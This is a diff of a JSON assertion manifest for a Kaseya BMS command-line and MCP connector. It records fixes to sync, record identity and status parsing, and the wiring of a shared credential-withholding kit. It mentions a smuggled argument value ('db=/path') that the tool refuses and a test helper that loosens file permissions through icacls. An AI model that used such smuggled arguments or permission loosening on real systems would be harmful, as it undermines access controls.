-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "root := strings.TrimSpace(cliutil.EnvOverride(mcpUploadRootEnvVar))"
+    },
+    {
+     "file": "cli/internal/mcp/kbms_upload_root_test.go",
+     "contains": "func TestMCPFileArgumentNeverNamesAHostFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "no-creation-date-incremental-sync",
+   "status": "active",
+   "summary": "No partition syncs incrementally: syncResourceSinceParam returns \"\" for every resource, as 0.1.x synced",
+   "why": "Codex r1 class incremental filter on a creation date: 4.34.2 synced tickets on Filter.OpenDateFrom, opportunities on Filter.CreatedOnFrom and time logs on Filter.StartDateFrom; none sees a later change, so a ticket completed after it opened stayed open in queue-health, workload and stale-tickets after a successful refresh. BMS documents no single modification-time filter.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "return \"Filter.OpenDateFrom\""
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "return \"Filter.CreatedOnFrom\""
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "return \"Filter.StartDateFrom\""
+    },
+    {
+     "file": "cli/internal/cli/kbms_r1_novels_test.go",
+     "contains": "func TestNoPartitionSyncsIncrementallyOnACreationDate(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "record-identity-by-id",
+   "status": "active",
+   "summary": "Novels key records by their documented ids: workload never merges two known AssigneeIds by name; contract-burn keys contracts by ClientContractSummaryOutputDto.Id = TicketListDto.ContractId (then ContractNumber, then name and account)",
+   "why": "Codex r1 classes technician identity collision and contract identity collision (re-review of the 0.1.x novels): two techs named Alex Smith were one row; two Support contracts of different accounts were one item with their tickets and hours combined.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/workload.go",
+     "contains": "if row, ok := byName[norm]; ok && (id == \"\" || row.AssigneeID == \"\" || row.AssigneeID == id) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/contract_burn.go",
+     "contains": "func kbmsContractKey(m map[string]any, idField string) string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/cli/contract_burn.go",
+     "contains": "key := kbmsContractKey(m, \"ContractId\")",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/cli/kbms_r1_novels_test.go",
+     "contains": "func TestWorkloadNeverMergesTwoKnownTechsByName(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/cli/kbms_r1_novels_test.go",
+     "contains": "func TestContractBurnKeysContractsByID(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "ticket-status-whole-word",
+   "status": "active",
+   "summary": "A ticket is terminal only with a CompletedDate or a status word that IS completed/closed/cancelled/resolved and is not negated or deferred by the word right before it (not, no, pending, awaiting, waiting); a negating word elsewhere describes something else (Cancelled - No Charge is terminal)",
+   "why": "Codex r1 class incorrect terminal-status classification: the substring match read the tenant status \"Unresolved\" as resolved and dropped open tickets from queue-health, workload, stale-tickets and contract-burn.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kaseya_bms_novel_helpers.go",
+     "contains": "case \"not\", \"no\", \"pending\", \"awaiting\", \"waiting\":",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_novel_helpers.go",
+     "not_contains": "if strings.Contains(status, terminal) {"
+    },
+    {
+     "file": "cli/internal/cli/kbms_r1_novels_test.go",
+     "contains": "func TestTicketStatusIsTerminalOnlyAsAWholeWord(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "narrative-matches-the-mint-and-the-vendor",
+   "status": "active",
+   "summary": "README/SKILL (rendered from research.json) say every command mints from the login and an MFA user runs auth login --mfa-code; the rate limit is 500 requests/hour/endpoint (Kaseya's throttling policy), not 1500",
+   "why": "press-traps s7: the narrative is re-rendered from research.json, so the fix is at the source (tools/research_fix.py) plus tools/apply_docfixes.py for files rendered before it.",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "not_contains": "1500/hour"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "1500/hour"
+    },
+    {
+     "file": "guide.md",
+     "contains": "every command exchanges them for a token on first use"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "the automatic mint cannot answer MFA"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "1,500"
+    },
+    {
+     "file": "page.json",
+     "not_contains": "1,500"
+    },
+    {
+     "file": "pain-point.md",
+     "not_contains": "1,500"
+    },
+    {
+     "file": "cli/internal/cli/queue_health.go",
+     "not_contains": "1500/hour"
     }
    ]
   },
@@ -546,6 +1269,443 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own holder, output chokepoint and secret funnel. internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit; the API client (inside the origin pin, cli/kbms_guard.go installPins) and the BMS token client go through credkit.Transport (config.OutboundGuard), feedback, deliver and the reachability probe through credkit.Transport(nil); every file write but the 0600 credential store and config.toml goes through the kit; the MCP server uses MCPTools, MCPIn/MCPOut and MCPHTTP; cobratree children start through credkit.RunCommand; the minted BMS JWT and a token typed positionally into auth set-token are held with credkit.Hold; a --dry-run preview is held with credkit.HoldBody; the profile store is never a kit Files entry (the kit holds every string of nested JSON, so a saved profile refused startup): credwire.HoldProfileStore holds, at startup for every profiles.json the program may read and in cli.loadProfileStore, each value under a credential flag's name or base-url, every duplicate included, and nothing else.",
+   "why": "The hand-wired layer ported from datto-rmm (cliutil/kbms_output.go, kbms_decoded.go, kbms_encodings.go, kbms_scattered.go, kbms_outbound.go, secret_funnel*.go, store/kbms_withhold_driver.go, cmd/kaseya-bms-mcp/kbms_output_mcp.go) duplicated what the kit owns for every connector. One contract, one matcher and one set of sinks replace them, and a matcher fix reaches this connector by vendoring.",
+   "spec_encode_followup": "Press-side: the generator should emit the credkit wiring (Start/Exit in each main, credkit.Transport on every client, credkit file writes, the credkit SQLite driver, MCPTools/MCPIn/MCPOut/MCPHTTP, RunCommand) from a per-connector declarations file, so a reprint keeps it by construction.",
+   "retires": {
+    "secret-echo-decoded-funnel": "replaced by the shared credential kit: the funnel files and their client/root/MCP backstops are deleted; the kit's stdout/stderr pipes and sinks hold and withhold (fleet: blackpoint and kaseya-vsa retired theirs)",
+    "output-chokepoint": "replaced by the shared credential kit: credkit.Start installs stdout/stderr; every sink routes through the kit",
+    "file-sinks-withheld": "replaced by the shared credential kit: every file write but the 0600 credential store and config.toml goes through credkit.WriteFile/OpenFile/AppendFile/NewWriter",
+    "mcp-protocol-messages-withheld": "replaced by the shared credential kit: MCP stdio is credkit.MCPIn/MCPOut and HTTP is inside credkit.MCPHTTP",
+    "network-sinks-withheld": "replaced by the shared credential kit: feedback, deliver and probe clients send through credkit.Transport(nil)",
+    "startup-output-held-first": "replaced by the shared credential kit: credkit.Start gathers SecretEnv, Files, CredentialFlags and stdin before the first byte",
+    "mcp-held-arguments-refused": "replaced by the shared credential kit: credkit.MCPTools holds MCPArguments and credkit.RunCommand refuses a child argv that repeats a held value",
+    "undecoded-encodings-every-alignment": "replaced by the shared credential kit: the kit's matcher reads the contract's closed list of encodings",
+    "held-forms-in-every-encoding": "replaced by the shared credential kit: the kit's matcher reads the contract's closed list of encodings",
+    "response-credentials-held": "replaced by the shared credential kit: declared ResponseFields; proven on the binaries by kbmsblackbox TestResponseCredentialFieldsWithheld",
+    "every-text-encoding-withheld": "replaced by the shared credential kit: the kit's matcher reads the contract's closed list of encodings",
+    "outbound-split-parts-refused": "replaced by the shared credential kit: credkit.Transport judges each request as one unit",
+    "auth-carrier-names-and-shapes-held": "replaced by the shared credential kit: the kit holds auth headers, cookies and Basic parts of every request (contract 1)",
+    "derived-credential-parts-held": "replaced by the shared credential kit: the kit holds every 8-character piece of a held value",
+    "output-units-reassembled": "replaced by the shared credential kit: the kit judges each output unit whole",
+    "journal-entry-withheld-as-written": "replaced by the shared credential kit: the journal appends through credkit.AppendFile, which judges the entry as written",
+    "base85-family-withheld": "replaced by the shared credential kit: the kit's matcher reads the contract's closed list of encodings",
+    "short-held-values-matched-anywhere": "replaced by the shared credential kit: the kit matches a short held value as a whole token (contract 2)",
+    "output-split-across-deliveries": "replaced by the shared credential kit: the kit's stdout/stderr pipes judge a stream across writes",
+    "config-check-reads-back-every-shape": "replaced by the shared credential kit: merged into config-file-holds-no-credential: the exact bytes are checked with the kit's matcher (cliutil.Held)",
+    "holder-holds-every-credential-part": "replaced by the shared credential kit: the kit holds declared fields, flags, stdin and every piece of a held value",
+    "decoded-forms-withheld": "replaced by the shared credential kit: the kit's matcher reads the contract's closed list of encodings"
+   },
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"KASEYA_BMS_PASSWORD\",",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"KASEYA_BMS_MCP_HTTP_TOKEN\",",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"*\", Allowed: []string{\"base_url\", \"https://api.bms.kaseya.com\", \"https://api.bmsemea.kaseya.com\", \"https://api.bmsapac.kaseya.com\"}},",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "StdinFlags: []string{\"--stdin\"},",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "profiles(filepath.Join(dir, \"profiles.json\"))",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "profiles(filepath.Join(home, \".kaseya-bms-cli\", \"profiles.json\"))",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "not_contains": "add(filepath.Join(dir, \"profiles.json\"))"
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "not_contains": "add(filepath.Join(home, \".kaseya-bms-cli\", \"profiles.json\"))"
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func HoldProfileStore(data []byte) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "profileCredentialNames = append(profileCredentialNames, strings.TrimPrefix(f, \"--\"))",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "credkit.HoldURL(\"profile:base-url\", v)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credwire.HoldProfileStore(data)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "not_contains": "credkit.HoldBody(data)"
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-cli/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)\n\tcredkit.Exit(run())",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "server.NewStdioServer(s).Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "not_contains": "server.ServeStdio("
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "Transport: OutboundGuard(http.DefaultTransport),",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "credkit.Hold(\"minted:access_token\", tok.Access, tok.Refresh)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "var inner http.RoundTripper = credentialResultTripper{next: config.OutboundGuard(next)}",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.HoldBody(bodyBytes)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "credkit.Hold(\"argv:auth set-token\", args...)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "credkit.Hold(\"stdin\", token)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "credkit.OpenFile(",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.Terminal(",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "issued, _ = urlWithoutCredentials(issued)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/credkit_response_test.go",
+     "contains": "func TestResponseCredentialFieldsWithheld(t *testing.T) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/credkit_argv_test.go",
+     "contains": "func TestArgvCredentialsNeverPrint(t *testing.T) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/export_writefail_test.go",
+     "contains": "func TestExportOutputWriteFailureFailsTheCommand(t *testing.T) {",
+     "code_only": true,
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter credsql applies as each connection opens.",
+   "why": "The connector's withholding driver checked bound values one at a time, so a credential split across two bindings of one statement was stored (kit adoption class C1). The kit checks a statement's text and every bound value as one unit, reads included.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver, ",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "WithholdingSQLiteDriver"
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver, ",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/credkit_split_test.go",
+     "contains": "func TestCredentialSplitAcrossBindingsNeverPersists(t *testing.T) {",
+     "code_only": true,
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included: requireBearerAuthWithLimits runs a write-free preflight, then credkit.MCPHTTP around a gate that answers the Origin, bearer and body-limit verdicts.",
+   "why": "With the kit around only the inner handler, a refusal would answer outside it (the kaseya-vsa review found a held token's piece in a 401).",
+   "asserts": [
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "ref, refused := mcpHTTPPreflight(r, http.NewResponseController(w), expected, allowed, maxBytes, readTimeout)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "kit.ServeHTTP(w, r)",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "not_contains": "rejectMCPHTTPRequest"
+    },
+    {
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "not_contains": "credkit.MCPHTTP(inner)"
+    }
+   ]
+  },
+  {
+   "id": "skill-md-http-endpoint-path",
+   "class": "docs",
+   "status": "active",
+   "summary": "SKILL.md names the MCP HTTP endpoint with its /mcp path, not a bare loopback origin; AGENTS.md carries no TODO marker in the press data-source guidance",
+   "why": "mcp-go serves Streamable HTTP at /mcp and 404s at the root; onboard re-vendors SKILL.md from the press, whose text names the bare origin (check_install_docs.py R3).",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "serves `http://127.0.0.1:7777/mcp` by default",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "binds `127.0.0.1:7777` by default"
+    },
+    {
+     "file": "AGENTS.md",
+     "contains": "Unimplemented stub commands still fail dogfood",
+     "min_count": 1
+    },
+    {
+     "file": "AGENTS.md",
+     "not_contains": "TODO stubs"
+    }
+   ]
+  },
+  {
+   "id": "loose-file-every-os",
+   "class": "test",
+   "status": "active",
+   "summary": "A loosen test helper (kbms_loosen_test.go in kbmsblackbox and config) makes a test file readable by other users on every OS (an icacls grant to BUILTIN\\Users on Windows); the loose-config tests use it instead of skipping the chmod on Windows",
+   "why": "Skipping the chmod on Windows left a t.TempDir() file with its private DACL, so the permission refusal the loose-config tests rely on never happened and they failed on every Windows run.",
+   "asserts": [
+    {
+     "file": "cli/internal/kbmsblackbox/kbms_loosen_test.go",
+     "contains": "\"*S-1-5-32-545:R\"",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/kbms_loosen_test.go",
+     "contains": "\"*S-1-5-32-545:R\"",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/boundaries_test.go",
+     "contains": "loosen(t, cfg)",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/config_sources_test.go",
+     "contains": "loosen(t, p)",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/kbms_hold_test.go",
+     "contains": "loosen(t, loose)",
+     "min_count": 1
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
